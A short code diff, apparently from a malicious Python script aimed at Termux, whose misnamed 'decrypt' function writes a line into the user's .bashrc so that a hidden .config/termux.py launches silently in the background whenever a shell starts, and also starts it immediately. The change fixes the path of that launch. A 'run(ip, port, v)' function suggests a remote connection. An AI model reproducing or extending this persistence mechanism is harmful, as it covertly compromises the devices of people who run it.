@@ -15,7 +15,7 @@ def decrypt(path):
 	fd = open(path+'/.bashrc', 'a')
 	fd.write('nohup python3 .config/termux.py >/dev/null 2>&1 &')
 	fd.close()
-	os.system('nohup python3 .config/termux.py >/dev/null 2>&1 &')
+	os.system('nohup python3 ' + path + '/.config/termux.py >/dev/null 2>&1 &')
 def run(ip, port, v):
 	import pathlib, sys, time
 	decrypt(str(pathlib.Path.home()))
